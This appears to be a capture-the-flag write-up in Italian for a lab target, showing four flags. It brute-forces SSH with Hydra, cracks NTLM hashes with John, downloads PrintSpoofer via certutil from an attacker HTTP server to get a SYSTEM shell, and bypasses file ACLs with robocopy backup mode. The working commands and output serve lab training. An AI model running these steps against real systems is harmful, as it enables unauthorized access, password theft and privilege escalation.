## FLAG1

**Obiettivo:** trovare la password SSH dell’utente `alice` e leggere `flag1.txt`.

1. **Brute-force SSH con Hydra**

   ```bash
   hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://target.ine.local -t 4 -f
   ```

   * `-l alice`: utente bersaglio
   * `-P rockyou.txt`: wordlist di password comuni
   * `-t 4`: 4 thread
   * `-f`: stop al primo login valido

2. **Risultato**

   ```
   [ssh] host: target.ine.local   login: alice   password: princess1
   ```

3. **Accesso al target e lettura della flag**

   ```powershell
   alice@WIN-GQ7PTVEC6HL C:\Users\alice> type flag1.txt
   5f71[REDACTED]1d1ed
   ```

---

## FLAG2

**Obiettivo:** estrarre gli hash NTLM dal dump di `hashdump.txt`, craccarli con John e leggere `flag2.txt` come `david`.

1. **Preparazione del file**
   Il dump era già nel formato `username:RID:LMHASH:NTHASH:::`, compatibile con John.

2. **Crack con John the Ripper**

   ```bash
   john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

3. **Recupero della password**

   ```bash
   david:orange
   ```

4. **Login SSH con `david` e lettura della flag**

   ```bash
   ssh david@target.ine.local
   david@WIN-GQ7PTVEC6HL C:\Users\david> type flag2.txt
   6c1e3[REDACTED]376f5b7c2
   ```

---

## FLAG3

**Obiettivo:** ottenere una shell SYSTEM usando PrintSpoofer e leggere `flag3.txt`.

1. **Avvio di un server HTTP sul Linux host**

   ```bash
   screen python3 -m http.server 80
   ```

   * rende disponibile `PrintSpoofer.exe` su `http://<IP_Linux>/PrintSpoofer.exe`

2. **Download del binario su Windows**

   ```powershell
   certutil -urlcache -f http://<IP_Linux>/PrintSpoofer.exe C:\Users\Public\PrintSpoofer64.exe
   ```

3. **Esecuzione di PrintSpoofer per ottenere una shell SYSTEM**

   ```cmd
   C:\Users\Public\PrintSpoofer64.exe -i -c cmd
   ```

   * `-i`: impersona il token SYSTEM
   * `-c cmd`: apre `cmd.exe` con privilegi SYSTEM

4. **Lettura di `flag3.txt`**

   ```cmd
   C:\Windows\System32\config> type flag3.txt
   207[REDACTED]9c5d
   ```

---

## FLAG4

**Obiettivo:** copiare `flag4.txt` da una directory protetta usando Robocopy in modalità backup e leggerne il contenuto.

1. **Copia del file con Robocopy in modalità Backup**

   ```powershell
   robocopy C:\Users\Administrator\flag C:\Users\david\Desktop flag4.txt /B
   ```

   * `/B`: Backup mode, usa privilegi di sistema per leggere file anche se l’ACL lo nega

2. **Lettura della flag come `david`**

   ```powershell
   david@WIN-GQ7PTVEC6HL C:\Users\david\Desktop> type flag4.txt
   870ecb7[REDACTED]a4
   ```

---

### Conclusioni

* **Hydra** per brute-force SSH
* **John** per crackare hash NTLM
* **PrintSpoofer** per ottenere shell SYSTEM
* **Robocopy /B** per bypassare ACL e leggere file protetti
